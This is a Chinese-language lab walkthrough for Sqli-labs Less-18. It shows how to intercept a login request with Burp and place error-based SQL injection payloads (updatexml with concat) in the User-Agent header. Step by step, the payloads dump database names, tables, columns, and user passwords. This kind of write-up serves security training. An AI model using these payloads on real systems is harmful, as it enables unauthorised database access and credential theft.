
# Sqli-labs-Less-18
在进行第十八关的时候，也许会发生使用admin无法登陆的问题，这是因为在第十七关进行了密码重置<br />我们只需要将数据库重置一下就ok。<br />![](https://img-blog.csdnimg.cn/20200720095401635.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=TstR1&originHeight=269&originWidth=834&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
在第十八关<br />1.登录失败显示ip地址<br />2.登录成功显示ip地址和User-Agent<br />![](https://img-blog.csdnimg.cn/20200720095722466.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=h2SdG&originHeight=245&originWidth=818&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**在这里无论是在账户还是密码处都无法注入，因为进行了注释，但是当成功登录后前端页面回显了User-Agent信息，我们可以利用这个回显和报错注入来进行注入。**<br />![](https://img-blog.csdnimg.cn/2020072010061879.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=xcefl&originHeight=212&originWidth=963&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**在这里我们需要使用http头协议，使用burp进行抓包获取**<br />![](https://img-blog.csdnimg.cn/20200720101000955.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=WxC6l&originHeight=340&originWidth=633&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**我们在此处进行修改，修改完后点击放包**<br />User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:67.0) Gecko/20100101 Firefox/67.0 ' or updatexml(1,(concat(0x7e,(select database()),0x7e)),1) and '1'='1<br />![](https://img-blog.csdnimg.cn/20200720103659703.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=m9kec&originHeight=383&originWidth=1170&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

回显出当前数据库<br />![](https://img-blog.csdnimg.cn/2020072010352799.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=XtDR1&originHeight=257&originWidth=1288&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**查询数据库**<br />' or updatexml(1,(concat(0x7e,(select schema_name from information_schema.schemata limit 0,1),0x7e)),1) and '1'='1<br />![](https://img-blog.csdnimg.cn/20200720104110302.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=WUEIa&originHeight=382&originWidth=1366&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
![](https://img-blog.csdnimg.cn/20200720104200517.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=tZJrJ&originHeight=276&originWidth=1220&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**查询表（security）**<br />' or updatexml(1,(concat(0x7e,(select table_name from information_schema.tables where table_schema='security' limit 0,1),0x7e)),1) and '1'='1<br />![](https://img-blog.csdnimg.cn/20200720104934720.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=YISaW&originHeight=370&originWidth=1376&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
![](https://img-blog.csdnimg.cn/20200720105007922.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=XcIHF&originHeight=270&originWidth=1184&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**查询字段（为了方便只在burp中演示）**<br />' or updatexml(1,(concat(0x7e,(select column_name from information_schema.columns where table_name='users' limit 0,1),0x7e)),1) and '1'='1<br />![](https://img-blog.csdnimg.cn/20200720110319569.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=Bzvpt&originHeight=666&originWidth=1836&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**查询账户（username）**<br />' or updatexml(1,(concat(0x7e,(select username from security.users limit 0,1),0x7e)),1) and '1'='1<br />![](https://img-blog.csdnimg.cn/20200720105703285.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=WCakk&originHeight=671&originWidth=1823&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**查询密码（password）**<br />' or updatexml(1,(concat(0x7e,(select password from security.users limit 0,1),0x7e)),1) and '1'='1<br />![](https://img-blog.csdnimg.cn/20200720110223225.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=LBNox&originHeight=545&originWidth=1738&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
**以此类推爆出所有数据**

